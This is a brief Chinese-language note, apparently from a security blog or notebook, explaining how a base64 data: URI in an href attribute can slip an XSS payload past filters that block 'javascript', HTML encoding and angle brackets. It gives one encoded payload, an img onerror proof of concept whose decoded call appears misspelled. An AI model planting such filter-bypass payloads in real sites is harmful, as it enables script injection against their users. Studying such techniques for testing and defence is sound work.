base64编码可以绕过一定的过滤
假设可控点在
```html
<a href="可控点">
```
过滤了javascript，html编码，<,>那么这里就可以用base64编码了
payload如下：
```html
<a href="data:text/html;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXIoJ+a1i+ivlScpPg==">test</a>
```
![](https://s2.ax1x.com/2019/03/16/AVoJjx.png)


![AVoyvt.png](https://s2.ax1x.com/2019/03/16/AVoyvt.png)